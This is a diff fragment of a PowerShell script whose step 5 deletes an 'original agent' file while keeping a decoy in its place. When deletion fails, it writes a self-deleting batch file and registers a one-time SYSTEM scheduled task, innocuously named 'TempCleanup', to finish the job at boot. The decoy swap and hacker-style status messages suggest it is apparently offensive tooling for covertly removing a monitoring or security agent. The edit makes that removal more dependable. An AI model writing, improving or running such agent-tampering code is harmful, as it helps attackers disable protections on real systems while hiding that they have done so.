@@ -63,22 +63,18 @@ if ($LASTEXITCODE -eq 0) {
 }
 
 # ============================================================
-# 5. Clean up original (optional – we keep decoy, delete real)
+# 5. Clean up original (keep decoy, delete real)
 # ============================================================
 Start-Sleep -Seconds 2
-Remove-Item -Path $agentPath -Force -ErrorAction SilentlyContinue
-if (-not (Test-Path $agentPath)) {
+try {
+    Remove-Item -Path $agentPath -Force -ErrorAction Stop
     Write-Output "[+] Original agent file deleted (decoy remains)."
-} else {
-    Write-Output "[-] Original agent still exists – will be deleted on next reboot."
-    # Schedule deletion on next boot
+} catch {
+    Write-Output "[-] Original agent still exists – scheduling deletion on next reboot."
+    # Create a simple batch script to delete the file on next boot
     $tempScript = "$env:TEMP\del_agent.bat"
-    "@echo off
-    :loop
-    del /f /q `"$agentPath`" 2>nul
-    if exist `"$agentPath`" goto loop
-    del /f /q `"%~f0`"
-    " | Out-File $tempScript -Encoding ASCII
+    Set-Content -Path $tempScript -Value "@echo off`ndel /f /q `"$agentPath`"`ndel /f /q `"%~f0`"" -Encoding ASCII
+    # Create a one-time scheduled task to run the batch script as SYSTEM at next boot
     schtasks /create /tn "TempCleanup" /tr "$tempScript" /sc once /st 00:00 /ru SYSTEM /f | Out-Null
 }
 
